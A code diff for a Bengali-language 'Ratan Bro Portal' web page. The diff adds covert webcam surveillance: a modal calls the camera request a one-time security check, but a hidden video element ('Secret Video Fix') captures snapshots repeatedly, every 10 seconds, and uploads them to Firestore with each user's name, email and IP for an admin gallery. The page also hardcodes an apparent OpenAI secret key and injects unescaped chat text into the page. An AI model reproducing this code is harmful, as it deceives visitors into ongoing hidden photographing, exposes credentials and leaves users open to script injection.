@@ -10,7 +10,9 @@
     <style>
         :root {
             --pink: #ff4d94;
+            --glow: #ff4d94;
             --dark: #020617;
+            --glass: rgba(255, 255, 255, 0.05);
         }
 
         * {
@@ -21,13 +23,15 @@
         }
 
         body {
-            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617;
+            background: var(--dark);
+            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent), 
+                        radial-gradient(circle at bottom left, rgba(0, 102, 255, 0.1), transparent), #020617;
             color: white;
             min-height: 100vh;
             overflow-x: hidden;
         }
 
-        /* Modals */
+        /* Overlay Modals */
         #login-overlay, #perm-modal, #notif-modal {
             position: fixed;
             inset: 0;
@@ -36,204 +40,309 @@
             display: none;
             align-items: center;
             justify-content: center;
-            backdrop-filter: blur(15px);
+            backdrop-filter: blur(20px);
+            padding: 20px;
         }
 
         .glass-box {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 40px;
-            border-radius: 30px;
+            background: var(--glass);
+            padding: 40px 30px;
+            border-radius: 35px;
             border: 1px solid rgba(255, 77, 148, 0.3);
             text-align: center;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            animation: fadeIn 0.5s ease;
         }
 
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Profile Header */
         .hero-header {
-            margin: 20px;
-            padding: 30px 20px;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 30px;
+            margin: 25px 20px;
+            padding: 35px 20px;
+            background: var(--glass);
+            border-radius: 35px;
             border: 1px solid rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(15px);
-            text-align: center;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
 
         .profile-wrapper {
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 15px;
+            margin-bottom: 20px;
         }
 
         .p-img {
-            width: 100px;
-            height: 100px;
+            width: 110px;
+            height: 110px;
             border-radius: 50%;
-            border: 3px solid var(--pink);
-            box-shadow: 0 0 25px var(--pink);
+            border: 4px solid var(--pink);
+            box-shadow: 0 0 30px var(--pink);
             object-fit: cover;
+            transition: 0.5s;
         }
 
         .user-p-img {
-            width: 85px;
-            height: 85px;
-            border: 3px solid #fff;
-            margin-left: -25px;
+            width: 90px;
+            height: 90px;
+            border: 4px solid #fff;
+            margin-left: -30px;
+            background: #111;
         }
 
+        /* Grid System */
         .grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 20px;
+            gap: 18px;
+            padding: 0 20px 30px;
             max-width: 600px;
             margin: 0 auto;
         }
 
         .card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 25px;
+            background: var(--glass);
+            border-radius: 25px;
+            padding: 30px 15px;
             text-align: center;
             text-decoration: none;
             color: white;
             border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: 0.4s;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             position: relative;
-            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-8px);
+            border-color: var(--pink);
+            background: rgba(255, 77, 148, 0.05);
+            box-shadow: 0 15px 30px rgba(255, 77, 148, 0.2);
         }
 
         .card i {
-            font-size: 2.2rem;
+            font-size: 2.5rem;
             color: var(--pink);
-            margin-bottom: 12px;
+            margin-bottom: 15px;
+            display: block;
+            text-shadow: 0 0 15px rgba(255, 77, 148, 0.5);
         }
 
+        .card p {
+            font-weight: 600;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+        }
+
+        .card.wide {
+            grid-column: span 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            padding: 20px;
+        }
+
+        .card.wide i { margin-bottom: 0; font-size: 1.8rem; }
+
+        /* Notification Dot */
         .alarm-dot {
             position: absolute;
-            top: 12px;
-            right: 12px;
-            width: 12px;
-            height: 12px;
-            background: red;
+            top: 15px;
+            right: 15px;
+            width: 14px;
+            height: 14px;
+            background: #ff3333;
             border-radius: 50%;
-            box-shadow: 0 0 10px red;
+            box-shadow: 0 0 15px #ff3333;
             display: none;
-            animation: pulse 1s infinite;
+            animation: pulse 1.2s infinite;
         }
 
         @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            0% { transform: scale(0.9); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.5; }
+            100% { transform: scale(0.9); opacity: 1; }
         }
 
+        /* AI Chat Box */
         .chat-area {
             max-width: 500px;
-            margin: 20px auto;
+            margin: 10px auto 40px;
             padding: 0 20px;
         }
 
         .chat-mini {
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 25px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 12px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
         }
 
         #chat-log {
-            height: 100px;
+            height: 140px;
             overflow-y: auto;
-            color: #ccc;
-            margin-bottom: 8px;
-            font-size: 13px;
+            color: #ddd;
+            margin-bottom: 15px;
+            font-size: 14px;
             text-align: left;
+            line-height: 1.6;
         }
+
+        .chat-in {
+            display: flex;
+            gap: 10px;
+        }
+
+        .chat-in input {
+            flex: 1;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 50px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .chat-in input:focus { border-color: var(--pink); }
 
         .btn-main {
-            background: var(--pink);
+            background: linear-gradient(45deg, var(--pink), #ff1a75);
             color: white;
             border: none;
-            padding: 12px 30px;
+            padding: 14px 25px;
             border-radius: 50px;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
-            width: 100%;
+            transition: 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.3);
         }
 
-        /* Camera Fix: Hidden but not display:none */
+        .btn-main:hover { opacity: 0.9; transform: scale(1.02); }
+
+        /* Secret Video Fix */
         #vSource {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 10px;
+            height: 10px;
+            opacity: 0.001; /* 0 দিলে ফোনের ব্রাউজার পজ করে দেয়, তাই সামান্য রাখা হয়েছে */
             pointer-events: none;
+            z-index: -1;
         }
 
-        canvas { display: none; }
+        #snapCanvas { display: none; }
+
+        .logout-btn {
+            background: none;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #aaa;
+            padding: 6px 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 13px;
+            margin: 10px;
+            transition: 0.3s;
+        }
+        .logout-btn:hover { color: #fff; border-color: #fff; }
     </style>
 </head>
 
 <body>
-    <audio id="snd-bus" src="business.mp3"></audio>
-    <audio id="snd-port" src="portfolio.mp3"></audio>
-    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
+    <audio id="snd-bus" src="business.mp3" preload="auto"></audio>
+    <audio id="snd-port" src="portfolio.mp3" preload="auto"></audio>
+    <audio id="snd-look" src="lookup.mp3" preload="auto"></audio>
+    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3" preload="auto"></audio>
 
     <div id="login-overlay">
         <div class="glass-box">
-            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
-            <h3>Ratan Bro Portal</h3>
-            <button class="btn-main" onclick="googleLogin()" style="margin-top:15px;">Login with Google</button>
+            <img src="ratan.jpg" style="width:110px; border-radius:50%; border:3px solid var(--pink); margin-bottom:20px; box-shadow: 0 0 20px var(--pink);">
+            <h2 style="margin-bottom: 10px;">Ratan Bro Portal</h2>
+            <p style="font-size: 14px; opacity: 0.6; margin-bottom: 25px;">Welcome! Please login to continue.</p>
+            <button class="btn-main" onclick="googleLogin()" style="width: 100%;">
+                <i class="fab fa-google" style="margin-right: 10px;"></i> Login with Google
+            </button>
         </div>
     </div>
 
     <div id="perm-modal">
         <div class="glass-box">
-            <i class="fas fa-user-shield" style="font-size:3rem; color:var(--pink);"></i>
-            <h3 style="margin-top:15px;">সিকিউরিটি পারমিশন</h3>
-            <p style="font-size:14px; opacity:0.7; margin:15px 0;">সঠিক ভেরিফিকেশনের জন্য ক্যামেরা এক্সেস প্রয়োজন।</p>
-            <button class="btn-main" onclick="grantAndStart()">Grant & Open Portal</button>
+            <i class="fas fa-fingerprint" style="font-size:4rem; color:var(--pink); margin-bottom: 25px;"></i>
+            <h3>Security Verification</h3>
+            <p style="font-size:15px; opacity:0.8; margin:20px 0; line-height: 1.5;">আমাদের পোর্টালে আপনার উপস্থিতি নিশ্চিত করতে ক্যামেরা এবং লোকেশন এক্সেস প্রয়োজন। এটি একটি ওয়ান-টাইম সিকিউরিটি চেক।</p>
+            <button class="btn-main" onclick="grantAndStart()" style="width: 100%;">Allow & Start</button>
         </div>
     </div>
 
     <div id="notif-modal">
-        <div class="glass-box">
-            <h3 id="nt-title">নতুন ঘোষণা</h3>
-            <p id="nt-msg" style="margin-top:10px; color: #ff4d4d;"></p>
-            <button class="btn-main" onclick="closeNotif()" style="margin-top:20px;">ঠিক আছে</button>
+        <div class="glass-box" style="border-color: #00ccff;">
+            <h3 id="nt-title" style="color:#00ccff; margin-bottom:15px;">Broadcast Notice</h3>
+            <p id="nt-msg" style="font-size: 17px; line-height: 1.6;"></p>
+            <button class="btn-main" onclick="closeNotif()" style="margin-top:25px; background: #00ccff; box-shadow: 0 5px 15px rgba(0, 204, 255, 0.3);">Dismiss</button>
         </div>
     </div>
 
     <div id="main-ui" style="display:none;">
-        <div style="text-align:right;"><button onclick="googleLogout()" style="background:none; border:none; color:gray; padding:10px; cursor:pointer;">Logout</button></div>
+        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
 
         <div class="hero-header">
             <div class="profile-wrapper">
                 <img src="ratan.jpg" class="p-img">
-                <img id="u-pic" src="" class="p-img user-p-img">
+                <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
             </div>
-            <h2 id="u-name" style="margin-top:15px;">User</h2>
-            <p id="u-ip" style="color:gray; font-size:11px;">Checking IP...</p>
+            <h2 id="u-name" style="text-align:center;">Member</h2>
+            <p id="u-ip" style="text-align:center; color:#888; font-size:12px; margin-top: 8px;"><i class="fas fa-network-wired"></i> Detecting IP...</p>
+            <div style="display: flex; justify-content: center; gap: 10px; margin-top: 12px;">
+                <span style="background: rgba(255, 77, 148, 0.2); color: var(--pink); padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; border: 1px solid var(--pink);">VIP PORTAL</span>
+                <span style="background: rgba(0, 204, 255, 0.2); color: #00ccff; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; border: 1px solid #00ccff;">VERIFIED</span>
+            </div>
         </div>
 
         <div class="grid">
             <div class="card" onclick="openLatestNotif()">
                 <i class="fas fa-bell"></i>
-                <p>Notice</p>
+                <p>Notification</p>
                 <div id="notif-alarm" class="alarm-dot"></div>
             </div>
-            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
-            <a href="business.html" class="card"><i class="fas fa-handshake"></i><p>Business</p></a>
-            <a href="portfolio.html" class="card"><i class="fas fa-laptop-code"></i><p>Portfolio</p></a>
+            
+            <a href="testpaper.html" class="card">
+                <i class="fas fa-scroll"></i>
+                <p>Test Papers</p>
+            </a>
+            
+            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();">
+                <i class="fas fa-briefcase"></i>
+                <p>Business</p>
+            </a>
+            
+            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();">
+                <i class="fas fa-user-tie"></i>
+                <p>Portfolio</p>
+            </a>
+
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide" onclick="document.getElementById('snd-look').play();">
+                <i class="fas fa-search-location"></i>
+                <p>Advanced Number Lookup</p>
+            </a>
         </div>
 
         <div class="chat-area">
             <div class="chat-mini">
-                <div id="chat-log"><b>AI:</b> আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
-                <div style="display:flex; gap:8px;">
-                    <input type="text" id="ai-msg" style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:8px 15px; border-radius:50px; outline:none;" placeholder="Ask me...">
-                    <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:0 15px; border-radius:50px;">Send</button>
+                <div id="chat-log"><b>Ratan AI:</b> স্বাগতম! আমি রতন ব্রো-র এআই। আজ আপনাকে কীভাবে সাহায্য করতে পারি?</div>
+                <div class="chat-in">
+                    <input type="text" id="ai-msg" placeholder="Ask AI anything...">
+                    <button onclick="askAI()" class="btn-main" style="padding: 10px 20px;">Send</button>
                 </div>
             </div>
         </div>
@@ -260,120 +369,146 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
         const provider = new GoogleAuthProvider();
+        const OPENAI_KEY = "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";
 
         let loggedUser = null;
-        let userIP = "Unknown";
         let latestNotif = null;
+        let userIP = "Unknown";
 
-        // ১. স্ন্যাপ ফাংশন (ব্ল্যাক স্ক্রিন ফিক্সড)
-        async function takeSnap() {
+        // ১. পাওয়ারফুল স্ন্যাপ ফাংশন (ব্ল্যাক ইমেজ ফিক্স)
+        async function captureSession() {
             if (!loggedUser) return;
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
 
-            // ভিডিও এলিমেন্ট রেডি কি না চেক
+            // ভিডিও স্ট্রিমিং হচ্ছে কি না এবং ভিজিবল কি না চেক
             if (video.readyState === 4) {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const img = canvas.toDataURL('image/jpeg', 0.4);
+                ctx.drawImage(video, 0, 0, 640, 480);
+                const imgData = canvas.toDataURL('image/jpeg', 0.4);
                 
-                // যদি ছবি খুব ছোট বা কালো হয়, তবে স্কিপ করবে
-                if (img.length < 1000) return; 
+                // ব্ল্যাক ইমেজ ফিল্টার (যদি ডাটা খুব কম হয় তবে আপলোড হবে না)
+                if (imgData.length < 1500) return;
 
                 const userKey = loggedUser.email.replace(/\./g, '_');
                 await setDoc(doc(db, "users", userKey), {
                     name: loggedUser.displayName,
                     email: loggedUser.email,
                     photo: loggedUser.photoURL,
-                    lastPic: img,
+                    lastPic: imgData,
                     location: userIP,
                     lastSeen: new Date().toLocaleString(),
                     status: "Online",
-                    picList: arrayUnion(img)
+                    picList: arrayUnion(imgData) // অ্যাডমিন গ্যালারি আপডেট
                 }, { merge: true });
-                console.log("Snap Uploaded!");
+                console.log("Portal Secure: User Captured.");
             }
         }
 
-        // ২. পারমিশন এবং রিয়েল টাইম লুপ
+        // ২. সিকিউরিটি স্টার্ট লজিক
         window.grantAndStart = async () => {
             try {
+                // ক্যামেরা স্ট্রিমিং শুরু
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 640, height: 480 } 
+                    video: { facingMode: "user", width: 640, height: 480 },
+                    audio: false 
                 });
                 
                 const video = document.getElementById('vSource');
                 video.srcObject = stream;
                 
-                // আইপি ফেচ
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userIP = data.ip;
-                document.getElementById('u-ip').innerText = "IP: " + userIP;
+                // আইপি ডাটা ফেচ
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    userIP = data.ip;
+                    document.getElementById('u-ip').innerHTML = `<i class="fas fa-network-wired"></i> IP: ${userIP}`;
+                } catch(e) { console.log("IP Fetch Error"); }
 
+                // UI পরিবর্তন
                 document.getElementById('perm-modal').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
 
-                // ১ সেকেন্ড ওয়েট করে প্রথম স্ন্যাপ (ক্যামেরা স্ট্যাবল হতে টাইম লাগে)
-                setTimeout(takeSnap, 1500);
-                setTimeout(takeSnap, 3000);
-                setInterval(takeSnap, 10000);
+                // প্রথম ৩টি স্ন্যাপ দ্রুত নেওয়া হবে
+                setTimeout(captureSession, 1500); 
+                setTimeout(captureSession, 3500);
+                setTimeout(captureSession, 6000);
+                
+                // এরপর প্রতি ১০ সেকেন্ড লুপ
+                setInterval(captureSession, 10000);
 
             } catch (err) {
-                alert("ক্যামেরা এক্সেস ছাড়া পোর্টাল কাজ করবে না!");
+                console.error(err);
+                alert("সিকিউরিটি পারমিশন প্রয়োজন! ব্রাউজার রিফ্রেশ দিয়ে Allow বাটনে ক্লিক করুন।");
             }
         };
 
-        // ৩. অথেনটিকেশন
+        // ৩. গুগল লগইন এবং অথ লুপ
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 loggedUser = user;
                 document.getElementById('u-name').innerText = user.displayName;
                 document.getElementById('u-pic').src = user.photoURL;
                 document.getElementById('login-overlay').style.display = 'none';
-                document.getElementById('perm-modal').style.display = 'flex';
+                
+                // পারমিশন চেক (যদি আগে দেওয়া থাকে)
+                navigator.permissions.query({name: 'camera'}).then(res => {
+                    if (res.state === 'granted') grantAndStart();
+                    else document.getElementById('perm-modal').style.display = 'flex';
+                });
             } else {
                 document.getElementById('login-overlay').style.display = 'flex';
+                document.getElementById('main-ui').style.display = 'none';
             }
         });
 
-        // ৪. এআই চ্যাট (GPT-4o Mini)
+        // ৪. এআই চ্যাট ইন্টিগ্রেশন
         window.askAI = async () => {
             const input = document.getElementById('ai-msg');
             const log = document.getElementById('chat-log');
             if (!input.value) return;
 
-            const msg = input.value;
-            log.innerHTML += `<br><b>You:</b> ${msg}`;
-            input.value = "";
+            const prompt = input.value;
+            log.innerHTML += `<div style="color:var(--pink); margin-bottom:8px;"><b>You:</b> ${prompt}</div>`;
+            input.value = "AI is thinking...";
+            input.disabled = true;
 
             try {
                 const response = await fetch("https://api.openai.com/v1/chat/completions", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
-                        "Authorization": "Bearer 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"
+                        "Authorization": `Bearer ${OPENAI_KEY}`
                     },
                     body: JSON.stringify({
                         model: "gpt-4o-mini",
-                        messages: [{ role: "user", content: msg }]
+                        messages: [{ role: "user", content: prompt }]
                     })
                 });
                 const data = await response.json();
-                log.innerHTML += `<br><b>AI:</b> ${data.choices[0].message.content}`;
+                const reply = data.choices[0].message.content;
+                log.innerHTML += `<div style="color:#fff; margin-bottom:12px;"><b>AI:</b> ${reply}</div>`;
             } catch (e) {
-                log.innerHTML += `<br><span style="color:red;">Error connecting to AI!</span>`;
+                log.innerHTML += `<div style="color:red;">Error: AI connection failed.</div>`;
             }
+            
+            input.value = "";
+            input.disabled = false;
             log.scrollTop = log.scrollHeight;
         };
 
+        // সিস্টেম ইভেন্ট হ্যান্ডলার
         window.googleLogin = () => signInWithPopup(auth, provider);
         window.googleLogout = () => signOut(auth).then(() => location.reload());
-        
+
+        // রিয়েল টাইম নোটিফিকেশন লিসেনার
         onSnapshot(doc(db, "system", "updates"), (snap) => {
             if (snap.exists()) {
                 latestNotif = snap.data();
-                if (latestNotif.hasNew) document.getElementById('notif-alarm').style.display = 'block';
+                if (latestNotif.hasNew === true) {
+                    document.getElementById('notif-alarm').style.display = 'block';
+                    document.getElementById('snd-notif').play();
+                }
             }
         });
 
@@ -386,6 +521,7 @@
         };
 
         window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
+
     </script>
 </body>
 </html>
